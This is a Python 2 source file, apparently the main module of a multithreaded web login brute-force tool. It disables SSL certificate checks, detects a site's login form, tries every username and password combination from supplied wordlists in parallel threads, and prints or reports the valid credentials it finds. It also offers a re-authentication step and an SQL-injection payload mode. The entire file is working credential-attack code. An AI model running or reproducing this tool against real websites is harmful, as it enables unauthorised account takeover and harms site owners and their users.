#!/usr/bin/python

# CHECK IMPORTING MODULES

try:
	import sys, ssl, time, mechanize, re, threading, os, requests
	from core import actions, utils, tbrowser, options
	from modules import loginbrute, httpget

except ImportError as err:
	print(err)
	sys.exit("[x] Error while importing modules")

# A FIX FOR FORM HASH UTF8
# https://stackoverflow.com/a/33025422
reload(sys)
sys.setdefaultencoding('utf8')


def main(optionURL, setOptions, optionRunMode, setRunOptions, optionReauth):
	
	def do_job(jobs, trying, total):
		for job in jobs:
			job.start()

		for job in jobs:
			utils.progress_bar(trying, total)
			trying += 1
			job.join()
		
		return trying

	########################## SSL
	#	https://stackoverflow.com/a/35960702
	#
	########################## End ssl
	try:
		_create_unverified_https_context = ssl._create_unverified_context
	except AttributeError:
		# Legacy Python that doesn't verify HTTPS certificates by default
		pass
	else:
		# Handle target environment that doesn't support HTTPS verification
		ssl._create_default_https_context = _create_unverified_https_context

	try:
		from Queue import Queue
	except ImportError:
		from queue import Queue
	
	result = Queue()


	# BUG bad memory management
	
	optionUserlist, optionThreads, optionPasslist = setOptions.values()
	optionProxy, optionReport, optionVerbose = setRunOptions.values()
		
	try:
		optionUserlist = optionUserlist.split("\n")
	except:
		pass

	try:
		optionPasslist = optionPasslist.split("\n")
	except:
		pass

	# get login form info 
	# call brute
	
	IS_REGULAR = True
	

	# IF NOT HTTP BASIC AUTHENTICATION, CHECK RESULT AND PARSE LOGIN FORM
	proc = tbrowser.startBrowser()
	#proc.addheaders = [('User-Agent', tbrowser.useragent())]

	if optionRunMode not in ["--httpget"]:

		try:
			utils.printf("[+] Checking connection...")
			proc.open(optionURL)
			utils.printf("[*] Get page: ['%s']" %(proc.title()), "good")
			if proc.geturl() != optionURL:
				utils.printf("[*] Website directs to: %s" %(proc.geturl()), "norm")
			#TODO PROXY
			utils.printf("[+] Connect success! Detecting login form....")
			loginInfo = tbrowser.parseLoginForm(proc.forms())

		except Exception as err:
			utils.die("[x] Connection error. Exit!", err)

		finally:
			proc.close()

		try:
			if not loginInfo:
				utils.die("[x] URL error", "No login field found")
			
			else:
				if actions.size_o(loginInfo[1]) == 1: # Password checking only
					if optionVerbose:
						utils.printf("[*] Form ID: %s\n  [*] Password field: %s"
							%(loginInfo[0], loginInfo[1][0]), "good")
						del optionUserlist[:]
					optionUserlist = [""]
					IS_REGULAR = False

				elif actions.size_o(loginInfo[1]) == 2:
					if optionVerbose:
						utils.printf("[*] Form ID: %s\n"
							"   [*] Username field: %s\n"
							"   [*] Password field: %s"
							%(loginInfo[0], loginInfo[1][1], loginInfo[1][0]), "good")
				utils.printf("[+] Login form detected! Starting attack...")

		except Exception as err:
			utils.die("[x] Getting login information error", err)

			
	#### END OF CHECKING TARGET
	
	
	sizePasslist = actions.size_o(optionPasslist)
	sizeUserlist = actions.size_o(optionUserlist)
	total, trying = sizeUserlist * sizePasslist, 0

	workers = []
	
	utils.printf("[+] Task counts: %s tasks" %(total))

	############################
	#	Setting up threads
	############################
	
	try:
		for password in optionPasslist:
			for username in optionUserlist:
				username = username.replace("\n", "")
				password = password.replace("\n", "")

				####
				#	IF HAVE ENOUGH THREAD, DO IT ALL
				###
				if actions.size_o(workers) == optionThreads:
					trying = do_job(workers, trying, total)
					del workers[:]

				if optionRunMode == "--brute":
					worker = threading.Thread(
						target = loginbrute.submit,
						args = (
							optionURL, [password, username],
							optionProxy, optionVerbose, loginInfo, result, False
						)
					)
				elif optionRunMode == "--httpget":
					worker = threading.Thread(
						target = httpget.submit,
						args = (
							optionURL, username, password,
							optionProxy, optionVerbose, result
						)
					)
				worker.daemon = True
				workers.append(worker)
	
	######### END SETTING UP THREADS ################
		
		#DO ALL LAST TASKs
		trying = do_job(workers, trying, total)
		del workers[:]

	### CATCH ERRORS ###
	except KeyboardInterrupt:# as error:
		# TODO: kill running threads here
		utils.die("[x] Terminated by user!", "KeyboardInterrupt")

	except SystemExit:# as error
		utils.die("[x] Terminated by system!", "SystemExit")

	except Exception as error:
		utils.die("[x] Runtime error", error)

	### ALL TASKS DONE ####
	finally:
		"""
			All threads have been set daemon
			Running threads should be stopped after main task done
		"""
		############################################
		#	Get result
		#
		############################################

		try:
			credentials = list(result.queue)
			if actions.size_o(credentials) == 0:
				utils.printf("[-] No match found!", "bad")
				
			else:
				utils.printf(
					"\n[*] %s valid password[s] found:\n" %(
						actions.size_o(credentials)
					),
					"norm"
				)

				if IS_REGULAR:
					utils.print_table(("Username", "Password"), *credentials)
					utils.printf("")
					
					if optionReauth:
						from extras import reauth
						reauth.run(optionURL, credentials, optionThreads,
							optionProxy, optionVerbose)
				else:
					if optionRunMode != "--sqli":
						utils.print_table(("", "Password"), *credentials)
					else:
						utils.print_table(("Payload", ""), *credentials) # TODO: test more
			
			
			### CREATE REPORT ####
			if optionReport:
				try:
					import reports

					optionProxy = "True" if optionProxy else "False"
					report_name = "%s_%s" %(
						time.strftime("%Y.%m.%d_%H.%M"), optionURL.split("/")[2]
					)
					report_path = "%s/%s.txt" %(reports.__path__[0], report_name)
					
					reports.makeReport(
						utils.report_banner(
							optionURL,
							optionRunMode,
							optionProxy,
							optionThreads,
							credentials,
							report_name,
							runtime,
							IS_REGULAR),
						report_path)
					
					utils.printf("\n[*] Report file at:\n%s" %(report_path), "good")
					
				except Exception as err:
					utils.printf("[x] Error while creating report: %s" %(err), "bad")
						
		except Exception as err:
			utils.printf("\n[x] Error while getting result.\n", "bad")
			utils.printf(err, "bad")


		sys.exit(0)

if __name__ == "__main__":
	try:
		runtime = time.time()
		main(*options.getUserOptions())
	except Exception as err:
		utils.die("", err)
	finally:
		runtime = time.time() - runtime
		utils.printf("\n[*] Time elapsed: %0.5f [s]\n" %(runtime), "good")